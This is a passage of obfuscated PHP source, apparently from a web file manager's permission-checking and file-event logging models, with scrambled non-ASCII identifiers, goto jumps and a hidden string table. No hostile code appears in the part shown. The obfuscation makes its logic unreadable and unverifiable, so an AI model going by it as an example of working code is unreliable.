return $AêŞá¯–ö’; goto fù³÷²èÅ§; BŠø¹§åõ: $AñÍÒØõ¹İ = array_values(array_unique($AñÍÒØõ¹İ)); if (!$AñÍÒØõ¹İ) { return array(); } $Cù¨ßåòÀ = $dÚ‹·‡ˆĞâ[2216]; goto aÅÏ‡ìØ´É; FËöÃ‰î‘ç: $dÚ‹·‡ˆĞâ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$e†º‰èƒ‡Ş) { return array(); } $dà«ø÷äğ³ = Model($dÚ‹·‡ˆĞâ[1100]); goto Bã–‹Ö™›; fù³÷²èÅ§: } public function authDeepCheck($FÍÚËç¤ß‹, $EâÏêï… = false) { $eì­Ûõ¾ˆğ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (_get($GLOBALS, $eì­Ûõ¾ˆğ[461])) { return !1; } $AĞ¨ƒÚÂØË = $this->makeAuthDeep(); if (!in_array($FÍÚËç¤ß‹, $AĞ¨ƒÚÂØË)) { return !1; } return array($eì­Ûõ¾ˆğ[382] => -1, $eì­Ûõ¾ˆğ[422] => array($eì­Ûõ¾ˆğ[390] => $eì­Ûõ¾ˆğ[1021], $eì­Ûõ¾ˆğ[2072] => $eì­Ûõ¾ˆğ[472], $eì­Ûõ¾ˆğ[391] => LNG($eì­Ûõ¾ˆğ[2217]), $eì­Ûõ¾ˆğ[2084] => $eì­Ûõ¾ˆğ[2218])); } protected function makeAuthDeep() { goto eåßóˆï±İ; fîäÎÜà·ˆ: $A§ãò«ø = Model($eˆõñØÙÔó[2219])->listData(); $e•â±”š»æ = array(); foreach ($A§ãò«ø as $fÀ’Èå¬­) { if ($fÀ’Èå¬­[$eˆõñØÙÔó[381]] == 0 && $fÀ’Èå¬­[$eˆõñØÙÔó[2086]] == $eˆõñØÙÔó[83]) { $e•â±”š»æ[] = $fÀ’Èå¬­[$eˆõñØÙÔó[372]]; } } goto A„ÒùŒõ­†; A„ÒùŒõ­†: $bø‚¸ÇÓ½£ = Session::get($eˆõñØÙÔó[2178]); $bø‚¸ÇÓ½£ = array_to_keyvalue($bø‚¸ÇÓ½£, $eˆõñØÙÔó[33], $eˆõñØÙÔó[2066]); $FÕÛÅª©Æ = array($eˆõñØÙÔó[376] => SourceModel::TYPE_USER, $eˆõñØÙÔó[460] => USER_ID); goto Fà»çí˜æ; eîï†¯øÂ±: $F¶ÎÔêÖö = array_values(array_unique($F¶ÎÔêÖö)); foreach ($F¶ÎÔêÖö as $eš¡¬Éá‰õ) { $D—½¬§‘ìã = $b÷éÔÄÇ¥í->getInfo($eš¡¬Éá‰õ); $a¹£Ğ­¶¨ò[] = $D—½¬§‘ìã[$eˆõñØÙÔó[396]][$eˆõñØÙÔó[374]]; } $a¹£Ğ­¶¨ò = array_values(array_unique($a¹£Ğ­¶¨ò)); goto cŞÊõ¤ºí‚; B’§Ş÷³: $f± Ñ’ˆšœ = array_to_keyvalue($f»£ºà½¶, $eˆõñØÙÔó[33], $eˆõñØÙÔó[374]); $a¹£Ğ­¶¨ò = array(); $F¶ÎÔêÖö = $bø‚¸ÇÓ½£; goto Eùºè‰—é; Eùºè‰—é: $dÃÑ«÷”·– = Model($eˆõñØÙÔó[1100]); $b÷éÔÄÇ¥í = Model($eˆõñØÙÔó[462]); if ($f± Ñ’ˆšœ) { $BÉÎÌ¶à… = $dÃÑ«÷”·–->where(array($eˆõñØÙÔó[374] => array($eˆõñØÙÔó[389], $f± Ñ’ˆšœ)))->select(); foreach ($BÉÎÌ¶à… as $bºÃÒ¯Â«) { $F¬©‘”ã‡ = $dÃÑ«÷”·–->parentLevelArray($bºÃÒ¯Â«[$eˆõñØÙÔó[463]]); $a¹£Ğ­¶¨ò = array_merge($a¹£Ğ­¶¨ò, $F¬©‘”ã‡); $F¶ÎÔêÖö[] = $bºÃÒ¯Â«[$eˆõñØÙÔó[460]]; } } goto BĞƒÙšöªô; eåßóˆï±İ: $eˆõñØÙÔó =& $_SERVER[ºÖÙÂŒäÉê‡]; static $a¹£Ğ­¶¨ò = false; if ($a¹£Ğ­¶¨ò) { return $a¹£Ğ­¶¨ò; } goto fîäÎÜà·ˆ; cŞÊõ¤ºí‚: return $a¹£Ğ­¶¨ò; goto A¶Ûƒ‹¢ÉÒ; Fà»çí˜æ: if ($bø‚¸ÇÓ½£) { $FÕÛÅª©Æ = array(array($eˆõñØÙÔó[376] => SourceModel::TYPE_USER, $eˆõñØÙÔó[460] => USER_ID), array($eˆõñØÙÔó[376] => SourceModel::TYPE_GROUP, $eˆõñØÙÔó[460] => array($eˆõñØÙÔó[389], $bø‚¸ÇÓ½£)), $eˆõñØÙÔó[906] => $eˆõñØÙÔó[2146]); } if ($e•â±”š»æ) { $FÕÛÅª©Æ = array($FÕÛÅª©Æ, $eˆõñØÙÔó[2194] => array($eˆõñØÙÔó[2220], $e•â±”š»æ)); } $f»£ºà½¶ = $this->field($eˆõñØÙÔó[2221])->where($FÕÛÅª©Æ)->select(); goto B’§Ş÷³; BĞƒÙšöªô: $F¶ÎÔêÖö = array_values(array_unique($F¶ÎÔêÖö)); $dóùøáˆç¬ = $F¶ÎÔêÖö; foreach ($dóùøáˆç¬ as $eš¡¬Éá‰õ) { $D—½¬§‘ìã = $b÷éÔÄÇ¥í->getInfo($eš¡¬Éá‰õ); $F¬©‘”ã‡ = $dÃÑ«÷”·–->parentLevelArray($D—½¬§‘ìã[$eˆõñØÙÔó[463]]); $F¶ÎÔêÖö = array_merge($F¶ÎÔêÖö, $F¬©‘”ã‡); } goto eîï†¯øÂ±; A¶Ûƒ‹¢ÉÒ: } private function makeSourceAuth($FÜÓ§ÅŸÓ, $aÙîÃ”›¨) { goto AöĞ´Ç¸—Ç; dè¢”ø‡Íó: $Bµ‹‹Õ²õâ = array_merge(array($FÜÓ§ÅŸÓ[$d»Öî±“Ï[374]]), array_reverse($Bµ‹‹Õ²õâ)); $DŞ­³‹†’ = !1; foreach ($Bµ‹‹Õ²õâ as $eƒçè‘ˆÓ½) { if (!isset($aÙîÃ”›¨[$eƒçè‘ˆÓ½])) { continue; } $CÅà”Õ¸³¯ = $this->authMake($aÙîÃ”›¨[$eƒçè‘ˆÓ½]); if ($CÅà”Õ¸³¯[$d»Öî±“Ï[422]]) { $DŞ­³‹†’ = $CÅà”Õ¸³¯; break; } } goto bòŸ¶Õ”æÜ; bòŸ¶Õ”æÜ: if (!$DŞ­³‹†’) { $C‚º¤‹¥ºµ = array_to_keyvalue($C‚º¤‹¥ºµ, $d»Öî±“Ï[2066]); $fĞ©‚Úëë = $FÜÓ§ÅŸÓ[$d»Öî±“Ï[460]]; $B„éšÔŠ¾÷ = isset($C‚º¤‹¥ºµ[$fĞ©‚Úëë]) ? $C‚º¤‹¥ºµ[$fĞ©‚Úëë] : !1; if ($B„éšÔŠ¾÷) { $DŞ­³‹†’ = array($d»Öî±“Ï[2222] => intval($B„éšÔŠ¾÷[$d»Öî±“Ï[381]][$d»Öî±“Ï[381]]), $d»Öî±“Ï[2223] => $B„éšÔŠ¾÷[$d»Öî±“Ï[381]]); } } if ((!$DŞ­³‹†’ || $DŞ­³‹†’[$d»Öî±“Ï[382]] <= 0) && $FÜÓ§ÅŸÓ[$d»Öî±“Ï[376]] == SourceModel::TYPE_GROUP) { $FÅ³»•œ„ = $this->authDeepCheck($FÜÓ§ÅŸÓ[$d»Öî±“Ï[374]], $DŞ­³‹†’); if ($FÅ³»•œ„) { $DŞ­³‹†’ = $FÅ³»•œ„; } } return $DŞ­³‹†’; goto bÆî§ìÜÎõ; AöĞ´Ç¸—Ç: $d»Öî±“Ï =& $_SERVER[ºÖÙÂŒäÉê‡]; $C‚º¤‹¥ºµ = Session::get($d»Öî±“Ï[2178]); $Bµ‹‹Õ²õâ = Model($d»Öî±“Ï[1100])->parentLevelArray($FÜÓ§ÅŸÓ[$d»Öî±“Ï[463]]); goto dè¢”ø‡Íó; bÆî§ìÜÎõ: } public function authOwnerApply($aÑµ¨†‰Å¨) { goto B°ŞÕŞ·•î; a¦¥ÁùÆ¸Û: $aÑµ¨†‰Å¨[$b´†œÅƒëÃ[381]][$b´†œÅƒëÃ[2226]] = Model($b´†œÅƒëÃ[478])->userListInfo($C„‚µŸ); return $aÑµ¨†‰Å¨; goto FğÖßŒÈø¦; b›Õ™ÄÓè: $aÜØ¨·Ùº = array(); $C„‚µŸ = array(); foreach ($cÒÇ»¸¯Ã as $FÂğ­ŒÁ‘ƒ => $D‚‰ÇñçÀ) { $A´ëºš²„’ = $this->authFolderOwnerUser($D‚‰ÇñçÀ); $aÜØ¨·Ùº[$FÂğ­ŒÁ‘ƒ] = $A´ëºš²„’; $C„‚µŸ = array_merge($C„‚µŸ, $A´ëºš²„’[$b´†œÅƒëÃ[539]]); if ($A´ëºš²„’[$b´†œÅƒëÃ[2225]]) { break; } } goto Eæ‡ŸÕÍ”×; Eæ‡ŸÕÍ”×: if (count($C„‚µŸ) == 0) { $C„‚µŸ = $this->authFolderOwnerGroup($aÑµ¨†‰Å¨[$b´†œÅƒëÃ[460]]); } $C„‚µŸ = array_unique($C„‚µŸ); if (AuthModel::authCheckRoot($aÑµ¨†‰Å¨[$b´†œÅƒëÃ[381]][$b´†œÅƒëÃ[382]])) { $C„‚µŸ[] = USER_ID; } goto a¦¥ÁùÆ¸Û; aÁÇ”†«•: $D‘§§Ø× = Model($b´†œÅƒëÃ[1100])->parentLevelArray($aÑµ¨†‰Å¨[$b´†œÅƒëÃ[463]]); $D‘§§Ø× = array_merge(array($aÑµ¨†‰Å¨[$b´†œÅƒëÃ[374]]), array_reverse($D‘§§Ø×)); $Dî‹¾› = $b´†œÅƒëÃ[2216]; goto fº³µ×ö; fº³µ×ö: $BŠ¾ğŒô®Í = array($b´†œÅƒëÃ[388] => array($b´†œÅƒëÃ[389], $D‘§§Ø×)); $cÒÇ»¸¯Ã = $this->field($Dî‹¾›)->where($BŠ¾ğŒô®Í)->select(); $cÒÇ»¸¯Ã = array_to_keyvalue_group($cÒÇ»¸¯Ã, $b´†œÅƒëÃ[374]); goto b›Õ™ÄÓè; B°ŞÕŞ·•î: $b´†œÅƒëÃ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (empty($aÑµ¨†‰Å¨[$b´†œÅƒëÃ[381]]) || isset($aÑµ¨†‰Å¨[$b´†œÅƒëÃ[2224]]) && $aÑµ¨†‰Å¨[$b´†œÅƒëÃ[2224]]) { return $aÑµ¨†‰Å¨; } if (AuthModel::authCheckRoot($aÑµ¨†‰Å¨[$b´†œÅƒëÃ[381]][$b´†œÅƒëÃ[382]])) { return $aÑµ¨†‰Å¨; } goto aÁÇ”†«•; FğÖßŒÈø¦: } private function authFolderOwnerGroup($B“¯ÅÔ‰Ğ) { $F‰Í•ÄÑ­ø =& $_SERVER[ºÖÙÂŒäÉê‡]; $Bô”ªòç³‘ = Model($F‰Í•ÄÑ­ø[2140])->where(array($F‰Í•ÄÑ­ø[2066] => $B“¯ÅÔ‰Ğ))->select(); $F½â‰ŞŒ ô = array(); if (!$Bô”ªòç³‘) { return $F½â‰ŞŒ ô; } foreach ($Bô”ªòç³‘ as $F‹é°™‰Üò) { $a‰Ş® Ç¼Ç = $this->authInfo($F‹é°™‰Üò); if (AuthModel::authCheckRoot($a‰Ş® Ç¼Ç[$F‰Í•ÄÑ­ø[381]])) { $F½â‰ŞŒ ô[] = $F‹é°™‰Üò[$F‰Í•ÄÑ­ø[1403]]; } } return $F½â‰ŞŒ ô; } private function authFolderOwnerUser($bëö–…ìø) { $Dé±Ÿ‘•¨ =& $_SERVER[ºÖÙÂŒäÉê‡]; $DóšˆŸªÆÉ = array(); $C¼…•¡¸ùù = !1; foreach ($bëö–…ìø as $BÖŠ»‹ÏÎÙ) { $cÖªî™¾­ = $this->authInfo($BÖŠ»‹ÏÎÙ); if ($BÖŠ»‹ÏÎÙ[$Dé±Ÿ‘•¨[460]] == $Dé±Ÿ‘•¨[472]) { $C¼…•¡¸ùù = !0; } if ($BÖŠ»‹ÏÎÙ[$Dé±Ÿ‘•¨[376]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($cÖªî™¾­[$Dé±Ÿ‘•¨[381]])) { $DóšˆŸªÆÉ[] = $BÖŠ»‹ÏÎÙ[$Dé±Ÿ‘•¨[460]]; } } } return array($Dé±Ÿ‘•¨[539] => $DóšˆŸªÆÉ, $Dé±Ÿ‘•¨[2225] => $C¼…•¡¸ùù); } public function authMake($F®‘—ÀÑ) { goto aáé»²´Şæ; bë©Ü˜•¡ë: $c¶™•Ï¥•â = $FÆÌˆŠ‰Â ? $Eè‹…äõ : ($CéŞ“êÕÇ® ? $A¦¢‰èˆÁ : $d¾‘®‰£‡˜); $f×šÅ¶ãŠŠ = array($A‚«»ùÉÇ[2222] => intval($EÔÎÊİƒ¾), $A‚«»ùÉÇ[2223] => $c¶™•Ï¥•â); return $f×šÅ¶ãŠŠ; goto eñÙà¨ÓÑ; aáé»²´Şæ: $A‚«»ùÉÇ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$F®‘—ÀÑ) { return array($A‚«»ùÉÇ[382] => 0, $A‚«»ùÉÇ[422] => !1); } $Ağõ‰öµ = Session::get($A‚«»ùÉÇ[2178]); goto dÄˆ•‡æ•‹; aº÷ÜË‰Šá: $d¾‘®‰£‡˜ = 0; $FÆÌˆŠ‰Â = 0; $CéŞ“êÕÇ® = 0; goto aÓáªÓöÅ; Cò¢á†Û¯: $Fƒ„å†Ì¦¤ = 0; $Eè‹…äõ = 0; $A¦¢‰èˆÁ = 0; goto aº÷ÜË‰Šá; dÄˆ•‡æ•‹: $e‹íí·îÂ– = array_to_keyvalue($Ağõ‰öµ, $A‚«»ùÉÇ[33], $A‚«»ùÉÇ[2066]); $eù¡Ş›¥µ’ = 0; $aŸø‚Òë‰ = 0; goto Cò¢á†Û¯; aÓáªÓöÅ: $Fƒ¹À¯¤À = 0; foreach ($F®‘—ÀÑ as $f”–ã¾£ä¬) { $c¶™•Ï¥•â = $this->authInfo($f”–ã¾£ä¬); $fÆ§ÇÈì¬ñ = $f”–ã¾£ä¬[$A‚«»ùÉÇ[460]]; $FÀŒ¬˜ÕØ = intval($c¶™•Ï¥•â[$A‚«»ùÉÇ[381]]); if ($f”–ã¾£ä¬[$A‚«»ùÉÇ[376]] == SourceModel::TYPE_USER && $fÆ§ÇÈì¬ñ == USER_ID) { $FÆÌˆŠ‰Â = !0; $Eè‹…äõ = $c¶™•Ï¥•â; $eù¡Ş›¥µ’ = $FÀŒ¬˜ÕØ; } else { if ($f”–ã¾£ä¬[$A‚«»ùÉÇ[376]] == SourceModel::TYPE_GROUP && in_array($fÆ§ÇÈì¬ñ, $e‹íí·îÂ–)) { $CéŞ“êÕÇ® = !0; if ($FÀŒ¬˜ÕØ >= $aŸø‚Òë‰) { $aŸø‚Òë‰ = $FÀŒ¬˜ÕØ; $A¦¢‰èˆÁ = $c¶™•Ï¥•â; } } else { if ($fÆ§ÇÈì¬ñ == $A‚«»ùÉÇ[472]) { $Fƒ¹À¯¤À = !0; $d¾‘®‰£‡˜ = $c¶™•Ï¥•â; $Fƒ„å†Ì¦¤ = $FÀŒ¬˜ÕØ; } } } } $EÔÎÊİƒ¾ = $FÆÌˆŠ‰Â ? $eù¡Ş›¥µ’ : ($CéŞ“êÕÇ® ? $aŸø‚Òë‰ : $Fƒ„å†Ì¦¤); goto bë©Ü˜•¡ë; eñÙà¨ÓÑ: } public function authTargetInfoMake($A¹ÚÄË¡Í) { goto DçìÑŒ¿ß°; DçìÑŒ¿ß°: $Aù¿ê•–Ó• =& $_SERVER[ºÖÙÂŒäÉê‡]; $C·ÁÀ—‘¡ = array(); $fÔäî–„ª– = array(); goto déóËÏâ…ó; déóËÏâ…ó: foreach ($A¹ÚÄË¡Í as $eáÓİ—·) { if ($eáÓİ—·[$Aù¿ê•–Ó•[376]] == SourceModel::TYPE_USER) { $C·ÁÀ—‘¡[] = intval($eáÓİ—·[$Aù¿ê•–Ó•[460]]); } else { if ($eáÓİ—·[$Aù¿ê•–Ó•[376]] == SourceModel::TYPE_GROUP) { $fÔäî–„ª–[] = intval($eáÓİ—·[$Aù¿ê•–Ó•[460]]); } } } if ($C·ÁÀ—‘¡) { $C·ÁÀ—‘¡ = Model($Aù¿ê•–Ó•[478])->userListInfo($C·ÁÀ—‘¡); } if ($fÔäî–„ª–) { $a”‹Î”áÊæ = array($Aù¿ê•–Ó•[2138] => array($Aù¿ê•–Ó•[389], $fÔäî–„ª–)); $fÔäî–„ª– = Model($Aù¿ê•–Ó•[462])->field($Aù¿ê•–Ó•[2151])->where($a”‹Î”áÊæ)->select(); $fÔäî–„ª– = array_to_keyvalue($fÔäî–„ª–, $Aù¿ê•–Ó•[2066]); } goto a§ËÓ¡ğÇé; a§ËÓ¡ğÇé: return array($Aù¿ê•–Ó•[2227] => $C·ÁÀ—‘¡, $Aù¿ê•–Ó•[2228] => $fÔäî–„ª–); goto E§¨“®·Ö; E§¨“®·Ö: } private function authInfo($cºÄ½Æ–í) { $aÃâ¶ É¸¡ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($cºÄ½Æ–í[$aÃâ¶ É¸¡[2194]]) { $D…ÌÛ¥Ñ® = Model($aÃâ¶ É¸¡[2213])->listData($cºÄ½Æ–í[$aÃâ¶ É¸¡[2194]]); if (!$D…ÌÛ¥Ñ®) { return !1; $cª”ÊÀÂ = Model($aÃâ¶ É¸¡[2213])->listData(); $e®‹¨äšÒ = array_filter_by_field($cª”ÊÀÂ, $aÃâ¶ É¸¡[381], $aÃâ¶ É¸¡[472]); return $e®‹¨äšÒ; } $Eèµä¥µ½Ø = array_field_key($D…ÌÛ¥Ñ®, array($aÃâ¶ É¸¡[372], $aÃâ¶ É¸¡[28], $aÃâ¶ É¸¡[381], $aÃâ¶ É¸¡[2084], $aÃâ¶ É¸¡[2087])); $Eèµä¥µ½Ø[$aÃâ¶ É¸¡[2229]] = $cºÄ½Æ–í; return $Eèµä¥µ½Ø; } else { return array($aÃâ¶ É¸¡[390] => 0, $aÃâ¶ É¸¡[2072] => $cºÄ½Æ–í[$aÃâ¶ É¸¡[2195]], $aÃâ¶ É¸¡[391] => $aÃâ¶ É¸¡[33], $aÃâ¶ É¸¡[2084] => $aÃâ¶ É¸¡[2230]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\x75\x72\x63\145\x5f\145\166\145\156\164"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\x65\124\x69\x6d\145", "\x74\x69\x6d\x65", "\x69\156\163\145\162\164", "\146\x75\156\143\164\151\x6f\x6e"), array("\144\145\x73\143", '', "\151\x6e\163\145\x72\164\x2c\x75\x70\x64\x61\164\x65\54\163\145\154\x65\143\x74", "\x6a\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($f¶ïëæƒª, $e‹…³Š…Ü³, $c¾“ÎºŠ§Ô = '') { goto BàÛÙâ³ã“; dÅ¥†Ã†: $DÓºÑµ÷Å¿ = array($Fƒ‰§áÒŞ¤[388] => $f¶ïëæƒª, $Fƒ‰§áÒŞ¤[2231] => $B¸‰ÖŠ‚¤[$Fƒ‰§áÒŞ¤[465]], $Fƒ‰§áÒŞ¤[2232] => $B¸‰ÖŠ‚¤[$Fƒ‰§áÒŞ¤[28]], $Fƒ‰§áÒŞ¤[470] => $B¸‰ÖŠ‚¤[$Fƒ‰§áÒŞ¤[470]], $Fƒ‰§áÒŞ¤[1394] => USER_ID, $Fƒ‰§áÒŞ¤[393] => $e‹…³Š…Ü³, $Fƒ‰§áÒŞ¤[1396] => $c¾“ÎºŠ§Ô); $this->addSystemLog($e‹…³Š…Ü³, $DÓºÑµ÷Å¿); return $this->add($DÓºÑµ÷Å¿); goto BËî»ñ°ˆ‹; eßôª¸ùŠê: if (!$B¸‰ÖŠ‚¤) { return !1; } if ($this->isCacheEvent($B¸‰ÖŠ‚¤, $e‹…³Š…Ü³)) { return; } if ($c¾“ÎºŠ§Ô && is_string($c¾“ÎºŠ§Ô)) { $c¾“ÎºŠ§Ô = array($Fƒ‰§áÒŞ¤[2096] => $c¾“ÎºŠ§Ô); } goto dÅ¥†Ã†; BàÛÙâ³ã“: $Fƒ‰§áÒŞ¤ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$this->eventSave) { return; } $B¸‰ÖŠ‚¤ = Model($Fƒ‰§áÒŞ¤[1100])->sourceInfo($f¶ïëæƒª); goto eßôª¸ùŠê; BËî»ñ°ˆ‹: } private function addSystemLog($AËÓÈÁ‚¯, $BÓæø‚ˆ•˜) { $FÇŸ¦Š¯¥ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($AËÓÈÁ‚¯ == $FÇŸ¦Š¯¥[2233]) { $AËÓÈÁ‚¯ = $BÓæø‚ˆ•˜[$FÇŸ¦Š¯¥[409]][$FÇŸ¦Š¯¥[2234]]; } else { if (in_array($AËÓÈÁ‚¯, array($FÇŸ¦Š¯¥[2043], $FÇŸ¦Š¯¥[2235]))) { $AËÓÈÁ‚¯ = $BÓæø‚ˆ•˜[$FÇŸ¦Š¯¥[409]][$FÇŸ¦Š¯¥[689]]; } } $B’Ï°‰Ôø› = array_merge($BÓæø‚ˆ•˜, array($FÇŸ¦Š¯¥[2236] => $BÓæø‚ˆ•˜[$FÇŸ¦Š¯¥[374]], $FÇŸ¦Š¯¥[2237] => $BÓæø‚ˆ•˜[$FÇŸ¦Š¯¥[2237]])); Model($FÇŸ¦Š¯¥[2007])->addLog($FÇŸ¦Š¯¥[2238] . $AËÓÈÁ‚¯, $B’Ï°‰Ôø›); } private function isCacheEvent($Aó±°§ïø¤, $Cğì¤©’ŠÉ) { if ($Aó±°§ïø¤[$_SERVER[ºÖÙÂŒäÉê‡][376]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($fÕƒÀÊ¿×¼, $aÏŞ…ç¹¶õ) { $BÂ—Œœ™„¾ =& $_SERVER[ºÖÙÂŒäÉê‡]; $Dä¬é¶£‘Ü = Model($BÂ—Œœ™„¾[1100])->sourceInfo($fÕƒÀÊ¿×¼); $dˆŒæÓ’â¥ = array($BÂ—Œœ™„¾[2234] => $aÏŞ…ç¹¶õ, $BÂ—Œœ™„¾[28] => $Dä¬é¶£‘Ü[$BÂ—Œœ™„¾[28]]); return $this->addEvent($fÕƒÀÊ¿×¼, $BÂ—Œœ™„¾[2233], $dˆŒæÓ’â¥); } public function eventFileEdit($c„°áƒİÑõ) { $bšŸä·æ¤ =& $_SERVER[ºÖÙÂŒäÉê‡]; $D£×îçÉ•¨ = array($bšŸä·æ¤[2239] => $_SERVER[$bšŸä·æ¤[2240]], $bšŸä·æ¤[1713] => strtolower(ACTION)); return $this->addEvent($c„°áƒİÑõ, $bšŸä·æ¤[2034], $D£×îçÉ•¨); } public function eventRecycle($aê•ÒƒÕöÙ, $C½Â‹»‹îó) { return $this->addEvent($aê•ÒƒÕöÙ, $_SERVER[ºÖÙÂŒäÉê‡][2235], $C½Â‹»‹îó); } public function eventRemove($CãÑÔˆçÒ«) { $E‰˜«Œ¥ =& $_SERVER[ºÖÙÂŒäÉê‡]; $b‚‘´¡²©Ï = Model($E‰˜«Œ¥[1100])->sourceInfo($CãÑÔˆçÒ«); $aİ„ÎÔÉî = $b‚‘´¡²©Ï[$E‰˜«Œ¥[28]]; return $this->addEvent($b‚‘´¡²©Ï[$E‰˜«Œ¥[465]], $E‰˜«Œ¥[2033], $aİ„ÎÔÉî); } public function eventShare($BÆˆÈÓÍ•Ê, $bâ¡‚á‰¥’) { return $this->addEvent($BÆˆÈÓÍ•Ê, $_SERVER[ºÖÙÂŒäÉê‡][2043], $bâ¡‚á‰¥’); } public function eventMove($cªª•–ƒë, $A’É‘Á¡…è, $DÏÚšÑ÷Í³) { goto fŠÌ²¨é; d±±ÙƒÓÅö: $this->addEvent($cªª•–ƒë, $aÈ™Âò¬™[496], $A‘‰Ô”ù·); $cøÍÓ°àß = $E®»ÊÔº‘ ->sourceInfo($cªª•–ƒë); $A‘‰Ô”ù· = array($aÈ™Âò¬™[374] => $cøÍÓ°àß[$aÈ™Âò¬™[374]], $aÈ™Âò¬™[28] => $cøÍÓ°àß[$aÈ™Âò¬™[28]]); goto E¸ßôš°º; E¸ßôš°º: $this->addEvent($A’É‘Á¡…è, $aÈ™Âò¬™[2245], $A‘‰Ô”ù·); goto Cİµ³×‚³; fŠÌ²¨é: $aÈ™Âò¬™ =& $_SERVER[ºÖÙÂŒäÉê‡]; $E®»ÊÔº‘  = Model($aÈ™Âò¬™[1100]); $cøÍÓ°àß = $E®»ÊÔº‘ ->sourceInfo($cªª•–ƒë); goto B¡•Õò÷; B¡•Õò÷: $BîáíÖºù¿ = $E®»ÊÔº‘ ->sourceInfo($A’É‘Á¡…è); $Bˆ¹Î–ñ² = $E®»ÊÔº‘ ->sourceInfo($DÏÚšÑ÷Í³); $A‘‰Ô”ù· = array($aÈ™Âò¬™[996] => $A’É‘Á¡…è, $aÈ™Âò¬™[2241] => $BîáíÖºù¿[$aÈ™Âò¬™[28]], $aÈ™Âò¬™[2242] => $BîáíÖºù¿[$aÈ™Âò¬™[470]], $aÈ™Âò¬™[997] => $DÏÚšÑ÷Í³, $aÈ™Âò¬™[2243] => $Bˆ¹Î–ñ²[$aÈ™Âò¬™[28]], $aÈ™Âò¬™[2244] => $Bˆ¹Î–ñ²[$aÈ™Âò¬™[470]]); goto d±±ÙƒÓÅö; Cİµ³×‚³: } public function eventCopy($eƒ—œ²„Ç) { $this->eventCreate($eƒ—œ²„Ç, $_SERVER[ºÖÙÂŒäÉê‡][494]); } public function eventRename($Bõ„Ğ©ƒ², $eî¦æíÄ•Ê, $a—·–ƒ­ˆˆ) { $AºêÑ¤ÜæÓ =& $_SERVER[ºÖÙÂŒäÉê‡]; $F¥ÌŒÈŒß‡ = array($AºêÑ¤ÜæÓ[996] => $eî¦æíÄ•Ê, $AºêÑ¤ÜæÓ[997] => $a—·–ƒ­ˆˆ); return $this->addEvent($Bõ„Ğ©ƒ², $AºêÑ¤ÜæÓ[1112], $F¥ÌŒÈŒß‡); } public function eventAddComment($dŒÚ–šÅ¶”, $F„‰ÖÕÌ¨) { return $this->addEvent($dŒÚ–šÅ¶”, $_SERVER[ºÖÙÂŒäÉê‡][2246], $F„‰ÖÕÌ¨); } public function eventAddDesc($E°ÌÜñš, $e¦Ş…¢§ï¬) { return $this->addEvent($E°ÌÜñš, $_SERVER[ºÖÙÂŒäÉê‡][2247], $e¦Ş…¢§ï¬); } public function listBySource($f¾–ŞŠ†äÃ) { goto d¢ÕĞÀÁ‰î; FµÙ¦ŠÅ: if ($Eù­§È…¬¬[$BŒŠ…ï¸’±[375]] == $BŒŠ…ï¸’±[83]) { $cÓ±’á¨‡Â = Model($BŒŠ…ï¸’±[1100])->listSearchChildren($f¾–ŞŠ†äÃ, 20000); $cÓ±’á¨‡Â[] = $f¾–ŞŠ†äÃ . $BŒŠ…ï¸’±[366]; $A¾íã¤¹²™ = array($BŒŠ…ï¸’±[374] => array($BŒŠ…ï¸’±[7], $cÓ±’á¨‡Â)); } $e½¼¹÷£¾Ò = $this->where($A¾íã¤¹²™)->order($BŒŠ…ï¸’±[2248])->selectPage(); if ($e½¼¹÷£¾Ò[$BŒŠ…ï¸’±[356]][$BŒŠ…ï¸’±[357]] == 0) { $e½¼¹÷£¾Ò[$BŒŠ…ï¸’±[356]][$BŒŠ…ï¸’±[357]] = 1; $e½¼¹÷£¾Ò[$BŒŠ…ï¸’±[359]] = array(array($BŒŠ…ï¸’±[388] => $f¾–ŞŠ†äÃ, $BŒŠ…ï¸’±[2231] => $Eù­§È…¬¬[$BŒŠ…ï¸’±[465]], $BŒŠ…ï¸’±[1394] => $Eù­§È…¬¬[$BŒŠ…ï¸’±[383]], $BŒŠ…ï¸’±[393] => $BŒŠ…ï¸’±[2249], $BŒŠ…ï¸’±[394] => $Eù­§È…¬¬[$BŒŠ…ï¸’±[193]], $BŒŠ…ï¸’±[1396] => $BŒŠ…ï¸’±[33])); } goto B†Â‰¢§¨; d¢ÕĞÀÁ‰î: $BŒŠ…ï¸’± =& $_SERVER[ºÖÙÂŒäÉê‡]; $Eù­§È…¬¬ = Model($BŒŠ…ï¸’±[1100])->sourceInfo($f¾–ŞŠ†äÃ); $A¾íã¤¹²™ = array($BŒŠ…ï¸’±[388] => $f¾–ŞŠ†äÃ); goto FµÙ¦ŠÅ; B†Â‰¢§¨: $e½¼¹÷£¾Ò = $this->eventListParse($e½¼¹÷£¾Ò, $f¾–ŞŠ†äÃ); show_json($e½¼¹÷£¾Ò); goto Dæ×µàæã; Dæ×µàæã: } private function eventListParse($EÑÖ¶Ó‹Ó†, $A³¿ˆ¥ôƒ) { goto AÜ´ÃÂÄÂ; B•ƒáğ¶ãØ: return $EÑÖ¶Ó‹Ó†; goto D ‰øª’ˆ; AÜ´ÃÂÄÂ: $d÷š´Ë”ƒì =& $_SERVER[ºÖÙÂŒäÉê‡]; $EªÅ¢šŒÀ = $EÑÖ¶Ó‹Ó†[$d÷š´Ë”ƒì[359]]; $dòÒ‘Ô­òä = array_to_keyvalue($EªÅ¢šŒÀ, $d÷š´Ë”ƒì[33], $d÷š´Ë”ƒì[374]); goto D™“°É¿ª; D™“°É¿ª: $AÂÁÓóáäø = array_to_keyvalue($EªÅ¢šŒÀ, $d÷š´Ë”ƒì[33], $d÷š´Ë”ƒì[2237]); foreach ($EªÅ¢šŒÀ as $CÛß´ÓÙÈ) { $bí÷Á‹ñ·„ = $CÛß´ÓÙÈ[$d÷š´Ë”ƒì[409]]; if ($CÛß´ÓÙÈ[$d÷š´Ë”ƒì[29]] == 